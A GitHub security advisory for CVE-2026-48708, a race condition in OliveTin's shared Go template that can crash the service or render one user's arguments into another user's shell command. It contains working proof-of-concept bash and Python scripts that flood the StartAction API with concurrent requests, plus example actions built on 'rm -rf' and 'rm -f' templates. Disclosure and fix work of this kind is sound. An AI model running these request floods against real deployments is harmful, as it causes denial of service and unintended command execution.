# [H] OliveTin has a Concurrent Template Parsing Race Condition which Leads to Cross-Request Command Contamination

## Summary
Severity: High
Advisory: GHSA-7fq5-7wr8-rjwj
CVE: CVE-2026-48708
CWE: CWE-362, CWE-567
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-24
Source: https://github.com/advisories/GHSA-7fq5-7wr8-rjwj
Type: github-advisory

## Affected
- Go: `github.com/OliveTin/OliveTin` — affected >=0 <0.0.0-20260521225117-d74da9314005

## Details
## Summary

OliveTin's template engine uses a **single shared `text/template.Template` instance** (`tpl` package-level variable in `service/internal/tpl/templates.go`) across all goroutines. Every action execution calls `tpl.Parse(source)` followed by `t.Execute()` on this shared instance with no synchronization. When two or more actions execute concurrently (which is the normal case — each `ExecRequest` spawns a goroutine), a race condition occurs: one goroutine's `Parse` overwrites the template tree while another goroutine is calling `Execute`, causing:

1. **Cross-user command contamination**: User A's arguments rendered in User B's shell command template
2. **Go runtime panic**: Concurrent map writes in Go's `text/template` internal structures cause a fatal crash
3. **Incorrect command execution**: Template/argument mismatch produces unexpected or dangerous shell commands

## CWE

- CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization)
- CWE-567 (Unsynchronized Access to Shared Data in a Multithreaded Context)

## Affected Versions

- All versions (the shared template has existed since the template system was introduced)

## Details

### The Shared Template Instance

In `service/internal/tpl/templates.go`:

```go
var tpl = template.New("tpl").
    Option("missingkey=error").
    Funcs(template.FuncMap{"Json": jsonFunc})
```

This is a **package-level variable** — a single `*template.Template` shared across the entire process.

### Unsafe Parse + Execute Pattern

The `parseTemplate` function is called for every template rendering:

```go
func parseTemplate(source string, data any) (string, error) {
    t, err := tpl.Parse(source)   // Modifies shared tpl's internal Tree
    if err != nil {
        return "", err
    }

    var sb strings.Builder
    err = t.Execute(&sb, data)    // Reads from tpl's internal Tree
    // ...
}
```

**Critical**: `tpl.Parse(source)` returns the same pointer as `tpl` (Go's `template.Parse` modifies the receiver and returns it). So `t` and `tpl` are the **same object**. When two goroutines call `parseTemplate` concurrently:

```
Goroutine A (Action "echo {{ .Arguments.name }}"):
  1. tpl.Parse("echo {{ .Arguments.name }}")     → sets tpl.Tree = TreeA
  2. t.Execute(&sb, {Arguments: {"name": "safe"}}) → walks TreeA

Goroutine B (Action "rm -rf {{ .Arguments.path }}"):
  1. tpl.Parse("rm -rf {{ .Arguments.path }}")   → sets tpl.Tree = TreeB
  2. t.Execute(&sb, {Arguments: {"path": "/tmp"}}) → walks TreeB
```

If the goroutines interleave:
```
  A.Parse(TreeA) → B.Parse(TreeB) → A.Execute(dataA) → executes TreeB with dataA!
```

Goroutine A would execute `rm -rf {{ .Arguments.path }}` with `dataA` — which either errors (missing key) or, if `dataA` happens to have a `path` argument, executes with an unintended value.

### No Synchronization Exists

A search for any synchronization primitives in the `tpl` package confirms **zero mutex, lock, or atomic operations**:

```
$ grep -r "sync\.\|Mutex\|Lock\|mutex" service/internal/tpl/
(no results)
```

### Concurrent Goroutine Confirmation

In `service/internal/executor/executor.go`, `ExecRequest` launches each action in a new goroutine:

```go
func (e *Executor) ExecRequest(req *ExecutionRequest) (*sync.WaitGroup, string) {
    // ...
    go func() {
        e.execChain(req)    // Calls stepParseArgs → ParseTemplateWithActionContext → parseTemplate
        defer wg.Done()
    }()
    return wg, req.TrackingID
}
```

The execution chain includes `stepParseArgs`, which calls `ParseTemplateWithActionContext`, which calls `parseTemplate`. Multiple concurrent action executions will race on the shared `tpl` variable.

### Go Runtime Crash Vector

Go's `text/template.Parse` internally modifies the template's `common` struct, which contains a `tmpl map[string]*Template`. In Go, concurrent map writes cause an **unrecoverable fatal error**:

```
fatal error: concurrent map writes
goroutine X [running]:
runtime.throw(...)
```

This is not a panic that can be recovered — it terminates the entire process. Two concurrent `Parse` calls can trigger this, crashing OliveTin.

### Template Contamination Vector

Even without a crash, the race can produce dangerous results:

1. **User A** triggers action: `shell: "echo Hello {{ .Arguments.name }}"` with `name=Alice`
2. **User B** triggers action: `shell: "sudo systemctl restart {{ .Arguments.service }}"` with `service=nginx`
3. Race occurs: User A's `Execute` runs on User B's parsed template
4. If User A's arguments contain a `service` key, that value is substituted into `sudo systemctl restart {{ .Arguments.service }}`
5. If User A's arguments do NOT contain `service`, `missingkey=error` causes an error — but only AFTER the template was already partially evaluated

### Call Chain

```
API Request → ExecRequest (goroutine) → execChain → stepParseArgs
  → ParseTemplateWithActionContext → parseTemplate → tpl.Parse(source) + t.Execute(data)
                                                      ↑ RACE CONDITION ↑
                                                  (shared tpl variable)
```

## PoC

### Prerequisites

- OliveTin instance with at least 2 configured actions
- Ability to trigger concurrent action executions

### Config

```yaml
listenAddressSingleHTTPFrontend: 0.0.0.0:1337
logLevel: "DEBUG"
checkForUpdates: false

actions:
  - title: Safe Echo
    id: safe-echo
    shell: "echo 'Hello {{ .Arguments.name }}'"
    arguments:
      - name: name
        type: ascii

  - title: File Delete
    id: file-delete
    shell: "rm -f /tmp/{{ .Arguments.target }}"
    arguments:
      - name: target
        type: ascii_identifier
```

### Step 1: Trigger concurrent executions

```bash
#!/bin/bash
# Fire 50 concurrent requests to maximize race window
for i in $(seq 1 50); do
  curl -s -X POST http://127.0.0.1:1337/api/StartAction \
    -H 'Content-Type: application/json' \
    -d '{"bindingId":"safe-echo","arguments":[{"name":"name","value":"Alice"}]}' &

  curl -s -X POST http://127.0.0.1:1337/api/StartAction \
    -H 'Content-Type: application/json' \
    -d '{"bindingId":"file-delete","arguments":[{"name":"target","value":"test"}]}' &
done
wait
echo "All requests sent"
```

### Step 2: Check for crash

```bash
# If OliveTin crashed due to concurrent map writes:
curl -s http://127.0.0.1:1337/readyz
# Expected: Connection refused (process crashed)
```

### Step 3: Check logs for contamination

```bash
# Look for mismatched template executions in the OliveTin logs
grep -E "missingkey|Error executing template|concurrent" /var/log/olivetin.log
```

### Python PoC — Race Trigger

```python
#!/usr/bin/env python3
"""PoC: Template Race Condition — Cross-Request Contamination

Triggers concurrent action executions to race on the shared
text/template instance in service/internal/tpl/templates.go.

Expected outcomes:
1. Go fatal error: concurrent map writes (process crash)
2. Template error: map has no entry for key (cross-contamination detected)
3. Silent contamination: arguments rendered in wrong template
"""

import requests
import threading
import time

TARGET = "http://127.0.0.1:1337"
THREADS = 20
ITERATIONS = 100

crash_detected = threading.Event()
errors_detected = []

def fire_action_a():
    """Trigger 'safe-echo' action repeatedly."""
    for _ in range(ITERATIONS):
        if crash_detected.is_set():
            break
        try:
            resp = requests.post(
                f"{TARGET}/api/StartAction",
                json={
                    "bindingId": "safe-echo",
                    "arguments": [{"name": "name", "value": "Alice"}]
                },
                headers={"Content-Type": "application/json"},
                timeout=5
            )
            if resp.status_code != 200:
                errors_detected.append(f"Action A error: {resp.status_code} {resp.text}")
        except requests.exceptions.ConnectionError:
            crash_detected.set()
            errors_detected.append("CONNECTION REFUSED — Server likely crashed!")
            break
        except Exception as e:
            errors_detected.append(f"Action A exception: {e}")

def fire_action_b():
    """Trigger 'file-delete' action repeatedly."""
    for _ in range(ITERATIONS):
        if crash_detected.is_set():
            break
        try:
            resp = requests.post(
                f"{TARGET}/api/StartAction",
                json={
                    "bindingId": "file-delete",
                    "arguments": [{"name": "target", "value": "test"}]
                },
                headers={"Content-Type": "application/json"},
                timeout=5
            )
            if resp.status_code != 200:
                errors_detected.append(f"Action B error: {resp.status_code} {resp.text}")
        except requests.exceptions.ConnectionError:
            crash_detected.set()
            errors_detected.append("CONNECTION REFUSED — Server likely crashed!")
            break
        except Exception as e:
            errors_detected.append(f"Action B exception: {e}")

if __name__ == "__main__":
    print(f"[*] Launching {THREADS * 2} threads, {ITERATIONS} iterations each")
    print(f"[*] Target: {TARGET}")

    threads = []
    for _ in range(THREADS):
        threads.append(threading.Thread(target=fire_action_a))
        threads.append(threading.Thread(target=fire_action_b))

    start = time.time()
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    elapsed = time.time() - start

    print(f"\n[*] Completed in {elapsed:.1f}s")
    print(f"[*] Total requests: {THREADS * 2 * ITERATIONS}")

    if crash_detected.is_set():
        print("[!] SERVER CRASH DETECTED — concurrent map write panic")
    if errors_detected:
        print(f"[!] {len(errors_detected)} errors detected:")
        for err in errors_detected[:10]:
            print(f"    - {err}")
    else:
        print("[*] No errors detected (race window may not have been hit)")
        print("[*] Try increasing THREADS/ITERATIONS or checking server logs")
```

### Go Race Detector Verification

If you can run OliveTin with Go's race detector enabled:

```bash
cd service
go run -race . &
# Then trigger concurrent requests — the race detector will confirm the data race
```

Expected output:
```
WARNING: DATA RACE
  Write by goroutine X:
    text/template.(*Template).Parse()
    service/internal/tpl/templates.go:XX

  Previous read by goroutine Y:
    text/template.(*Template).Execute()
    service/internal/tpl/templates.go:XX
```

## Impact

- **Process Crash (DoS)**: Concurrent map writes in Go cause an unrecoverable `fatal error`, crashing the entire OliveTin service
- **Cross-User Command Contamination**: User A's arguments may be rendered in User B's shell command template, potentially executing commands with wrong/dangerous arguments
- **Privilege Escalation via Contamination**: If a low-privilege user's arguments contaminate a high-privilege action's template, the result could be unintended command execution
- **Data Leakage**: Arguments (which may contain secrets like passwords) could be rendered in another user's action output

## Remediation

1. **Create a new template per parse call** instead of reusing the package-level singleton:
   ```go
   func parseTemplate(source string, data any) (string, error) {
       t, err := template.New("").
           Option("missingkey=error").
           Funcs(template.FuncMap{"Json": jsonFunc}).
           Parse(source)
       if err != nil {
           return "", err
       }
       var sb strings.Builder
       err = t.Execute(&sb, data)
       // ...
   }
   ```

2. **Alternative**: Use `template.Must(tpl.Clone())` to create a thread-safe copy per call:
   ```go
   func parseTemplate(source string, data any) (string, error) {
       clone, _ := tpl.Clone()
       t, err := clone.Parse(source)
       // ...
   }
   ```

3. **Alternative**: Add a mutex around `parseTemplate` (but this serializes all template rendering and hurts performance):
   ```go
   var tplMutex sync.Mutex
   func parseTemplate(source string, data any) (string, error) {
       tplMutex.Lock()
       defer tplMutex.Unlock()
       // ...
   }
   ```

   Option 1 (new template per call) is the recommended fix — it's simple, safe, and has negligible performance impact.

## Resources

- Go `text/template` documentation: "A Template's Parse method must not be called concurrently"
- CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization
- `service/internal/tpl/templates.go` — shared `tpl` variable and `parseTemplate` function
- `service/internal/executor/executor.go` — `ExecRequest` goroutine launch (line ~524)

## References
- https://github.com/OliveTin/OliveTin/security/advisories/GHSA-7fq5-7wr8-rjwj
- https://nvd.nist.gov/vuln/detail/CVE-2026-48708
- https://github.com/OliveTin/OliveTin/commit/d74da9314005954dd49fa20dabf272247bc76519
- https://github.com/OliveTin/OliveTin
- https://github.com/OliveTin/OliveTin/releases/tag/3000.13.0
